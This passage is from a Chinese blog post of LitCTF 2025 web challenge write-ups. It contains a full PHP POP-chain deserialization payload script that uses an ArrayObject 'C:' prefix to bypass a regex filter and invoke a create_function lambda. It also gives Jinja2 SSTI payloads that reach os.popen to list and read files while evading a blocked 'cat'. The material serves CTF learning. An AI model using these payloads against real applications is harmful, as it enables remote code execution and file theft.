class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();<span class="comment">//对象被当作函数调用，触发__invoke()-&gt;Mitsuha</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;<span class="comment">//拼接，对象被当作字符串使用，触发__tostring()-&gt;KatawareDoki</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$kuchikamizake</span>;<span class="comment">//函数名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;<span class="comment">//参数值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">//调用 $soul 属性的 flag() 方法，传入 $kuchikamizake 和 $name 作为参数</span></span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);<span class="comment">//调用不存在的方法，触发__call()-&gt;Taki</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$Litctf2025</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Litctf2025&#x27;</span>];<span class="comment">//通过post表单提交</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[Oa]:[\d]+/i&quot;</span>, <span class="variable">$Litctf2025</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$Litctf2025</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;把O改成C不就行了吗,笨蛋!～(∠・ω&lt; )⌒☆&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>这道题的目的就是为在pop链中调用匿名函数</p>
+<ol>
+<li>先给出完整的pop链：Taki(__unserialize)-&gt;(Mitsuha__invoke)-&gt;(KatawareDoki__tostring)-&gt;(Taki__call)<br>关键是怎么在链中触发匿名函数呢？</li>
+</ol>
+<h2 id="public-ReflectionFunction-invoke-mixed-…-args-mixed"><a href="#public-ReflectionFunction-invoke-mixed-…-args-mixed" class="headerlink" title="public ReflectionFunction::invoke(mixed …$args): mixed"></a>public ReflectionFunction::invoke(mixed …$args): mixed</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个普通函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 1. 实例化ReflectionFunction，传入要操作的函数名</span></span><br><span class="line"><span class="variable">$refFunc</span> = <span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;add&#x27;</span>);</span><br><span class="line"><span class="comment">// 2. 调用invoke()执行函数，传入参数</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$refFunc</span>-&gt;<span class="title function_ invoke__">invoke</span>(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>; <span class="comment">// 输出：5</span></span><br></pre></td></tr></table></figure>
+<p>等价于</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$a</span> + <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$result</span> = (<span class="keyword">new</span> <span class="title class_">ReflectionFunction</span>(<span class="string">&#x27;add&#x27;</span>))-&gt;<span class="title function_ invoke__">invoke</span>(<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>
+<p>因此：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;<span class="comment">//__call()是在调用不存在的方法名时被触发的，$func是那个不存在的方法名(flag),$args是参数 $kuchikamizake == $args[0]和 $name == $args[1]</span></span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="comment">//调用 $soul 属性的 flag() 方法，传入 $kuchikamizake 和 $name 作为参数</span></span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);<span class="comment">//调用不存在的方法，触发__call()-&gt;Taki</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="使用C绕过"><a href="#使用C绕过" class="headerlink" title="使用C绕过"></a>使用C绕过</h2><blockquote>
+<p>preg_match(“&#x2F;^[Oa]:[\d]+&#x2F;i”, $Litctf2025),反序列化条件，字符串不能以 O:数字&#x2F;o:数字&#x2F;A:数字&#x2F;a:数字 开头（比如 O:123、a:45 都会被匹配）</p>
+</blockquote>
+<ul>
+<li>^：匹配字符串开头（关键，确保是开头字符）。<br>[Oa]：匹配大写 O 或小写 a（字符集）。</li>
+<li>:：匹配冒号（固定字符）。</li>
+<li>[\d]+：匹配 1 个或多个数字（\d 等价于 0-9，+ 表示至少 1 个）。</li>
+<li>&#x2F;i：正则的不区分大小写修饰符（所以实际会匹配 O:&#x2F;o:&#x2F;A:&#x2F;a:）。<br>实现了unserialize接口类的大概率是C打头，列出一些以C开头的原生类：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ArrayObject::unserialize</span><br><span class="line">ArrayIterator::unserialize</span><br><span class="line">RecursiveArrayIterator::unserialize</span><br><span class="line">SplDoublyLinkedList::unserialize</span><br><span class="line">SplQueue::unserialize</span><br><span class="line">SplStack::unserialize</span><br><span class="line">SplObjectStorage::unserialize</span><br></pre></td></tr></table></figure>
+<p>需要注意，这种方法在序列化时对php版本有要求，用7.3.4才可以输出以C开头的payload，换7.4或者8.0输出的就是O开头了，但在unserialize时对php版本没要求。<br>2. 爆破找到匿名函数名<br>create_function 生成的匿名函数名格式是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\0lambda_数字 （空字节 + lambda_ + 递增数字）</span><br></pre></td></tr></table></figure>
+<ul>
+<li>数字从 1 开始递增（如 lambda_1、lambda_2、lambda_10）；</li>
+<li>空字节 \0 是固定前缀，必须包含；</li>
+<li>数字范围：通常在 1~100 内（除非目标环境频繁调用 create_function，数字才会更大）。</li>
+</ul>
+<ol start="3">
+<li>脚本</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>, <span class="string">&#x27;die(`/readflag`);&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Taki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$musubi</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$magic</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;musubi = <span class="variable">$data</span>[<span class="string">&#x27;musubi&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;magic = <span class="variable">$data</span>[<span class="string">&#x27;magic&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;musubi)();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        (<span class="keyword">new</span> <span class="variable">$args</span>[<span class="number">0</span>](<span class="variable">$args</span>[<span class="number">1</span>]))-&gt;&#123;<span class="variable language_">$this</span>-&gt;magic&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mitsuha</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$thread</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;memory.<span class="variable language_">$this</span>-&gt;thread;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">KatawareDoki</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soul</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kuchikamizake</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;soul)-&gt;<span class="title function_ invoke__">flag</span>(<span class="variable">$this</span>-&gt;kuchikamizake,<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;call error!no flag!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi=<span class="keyword">new</span> <span class="title class_">Mitsuha</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory=<span class="keyword">new</span> <span class="title class_">KatawareDoki</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory-&gt;kuchikamizake=<span class="string">&#x27;ReflectionFunction&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory-&gt;name=<span class="string">&quot;\00lambda_10&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul=<span class="keyword">new</span> <span class="title class_">Taki</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul-&gt;musubi=<span class="string">&#x27;time&#x27;</span>;<span class="comment">//避免第二个 Taki 对象的 __unserialize() 中，($this-&gt;musubi)() 因 musubi=NULL 报错中断调用链；</span></span><br><span class="line"><span class="variable">$a</span>-&gt;musubi-&gt;memory-&gt;soul-&gt;magic=<span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aa</span>=<span class="keyword">new</span> <span class="title class_">Arrayobject</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>);<span class="comment">//用C 绕过</span></span><br><span class="line"><span class="variable">$payload</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\00&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="variable">$payload</span>);	<span class="comment">//解决空字节（\0）在 HTTP 传输中的丢失 / 截断问题	</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br></pre></td></tr></table></figure>
+<h1 id="星愿信箱-ssti"><a href="#星愿信箱-ssti" class="headerlink" title="星愿信箱(ssti)"></a>星愿信箱(ssti)</h1><p>[ssti]<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lamaper/p/19238664">https://www.cnblogs.com/lamaper/p/19238664</a></p>
+<h2 id="法一（lipsum）"><a href="#法一（lipsum）" class="headerlink" title="法一（lipsum）"></a>法一（lipsum）</h2><p>1. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;&#123;7*7&#125;&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p>发现输入内容不能为纯数字。<br>2. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;&#123;print(7*7)&#125;&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p>愿望被神秘力量屏蔽了<br>3. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(7*7)%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p>49<br>4.  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(self._dict_.TemplateReference_context.keys())%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/lipsum.png" alt="图片"><br>发现lipsum这个全局的函数对象<br>5. 构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read())%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/./img/lib.png" alt="图片"><br>6. 发现flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read())%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<ol start="7">
+<li>cat被屏蔽了改用more</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;more /f*&#x27;).read())%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="法二爆破"><a href="#法二爆破" class="headerlink" title="法二爆破"></a>法二爆破</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;%raw%&#125;</span><br><span class="line">&#123;%print(().__class__.__base__.__subclasses__()[137].__init__.__globals__[&#x27;popen&#x27;](&#x27;tac /flag&#x27;).read())%&#125;</span><br><span class="line">&#123;%endraw%&#125;</span><br></pre></td></tr></table></figure>
+<p>需要用bp对197这个数字进行爆破</p>
+<h1 id="easy-signin-php伪协议-ssrf"><a href="#easy-signin-php伪协议-ssrf" class="headerlink" title="easy_signin(php伪协议 ssrf)"></a>easy_signin(php伪协议 ssrf)</h1>
+      
+    </div>
+    <footer class="article-footer">
+      
+        <blockquote class="article-copyright">
+    <p><strong><span class="icon-user icon"></span>Author: </strong>cc</p>
+    <p><strong><span class="icon-link icon"></span>Permalink: </strong><a href="https://chq576.github.io/2026/03/14/Litctf2025/">https://chq576.github.io/2026/03/14/Litctf2025/</a></p>
+    <p><strong><span class="icon-pencil icon"></span>Title: </strong>「Litctf2025」</p>
+    <p><strong><span class="icon-calendar icon"></span>Published: </strong>2026-03-14 21:13:47</p>
+    <p><strong><span class="icon-calendar icon"></span>Updated: </strong>2026-03-26 23:47:23</p>
+    <p><strong><span class="icon-copyright icon"></span>License: </strong>All articles on this blog are licensed under the <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener nofollow noreferrer" target="_blank"><span class="icon-creative-commons"></span>BY-NC-SA</a> license agreement unless otherwise stated. Please indicate the source when reprinting!</p>
+    <span class="icon-creative-commons article-copyright-bg"></span>
+  </blockquote>
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap left">
+        
+          
+          
+            <img data-src="/images/cc.jpg" data-sizes="auto" alt="原型链污染" class="lazyload">
+          
+        
+        <a href="/2026/03/16/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" aria-label="Prev: 原型链污染" title="Prev: 原型链污染"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            原型链污染
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap right">
+      
+        
+        
+          <img data-src="/images/cc.jpg" data-sizes="auto" alt="md5" class="lazyload">
+        
+      
+      <a href="/2026/03/13/md5/" aria-label="Next: md5"  title="Next: md5"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          md5
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+      
+      
+        
+      
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            
+            <div class="selector-item" data-selector="giscus">
+              <span>giscus</span>
+            </div>
+            
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+      
+        <div class="comment giscus-comment" data-aos="fade-up"
+          id="giscus-comment">
+        </div>
+      
+    </div>
+  </section>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2026
+      
+      <span class="footer-info-sep rotate"></span>
+      cc
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        37.5k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        03:03
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-file%EF%BC%88%E7%9F%AD%E6%A0%87%E7%AD%BE-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">easy_file（短标签 文件上传 文件包含）</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#test-your-nc-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">test_your_nc(命令执行)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A4%9A%E9%87%8D%E5%AE%87%E5%AE%99%E6%97%A5%E8%AE%B0-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text">多重宇宙日记(原型链污染)</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%9B%E3%81%AE%E5%90%8D%E3%81%AF-pop%E9%93%BE-%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0-%E4%BD%BF%E7%94%A8c%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">君の名は(pop链 匿名函数 使用c绕过)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#public-ReflectionFunction-invoke-mixed-%E2%80%A6-args-mixed"><span class="toc-number">4.1.</span> <span class="toc-text">public ReflectionFunction::invoke(mixed …$args): mixed</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8C%E7%BB%95%E8%BF%87"><span class="toc-number">4.2.</span> <span class="toc-text">使用C绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%98%9F%E6%84%BF%E4%BF%A1%E7%AE%B1-ssti"><span class="toc-number">5.</span> <span class="toc-text">星愿信箱(ssti)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%B8%80%EF%BC%88lipsum%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">法一（lipsum）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%E7%88%86%E7%A0%B4"><span class="toc-number">5.2.</span> <span class="toc-text">法二爆破</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-signin-php%E4%BC%AA%E5%8D%8F%E8%AE%AE-ssrf"><span class="toc-number">6.</span> <span class="toc-text">easy_signin(php伪协议 ssrf)</span></a></li></ol>
+  
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/jn.jpg" data-sizes="auto" alt="cc" class="lazyload">
+  <div class="sidebar-author-name">cc</div>
+  <div class="sidebar-description">章鱼哥喜欢海绵宝宝</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
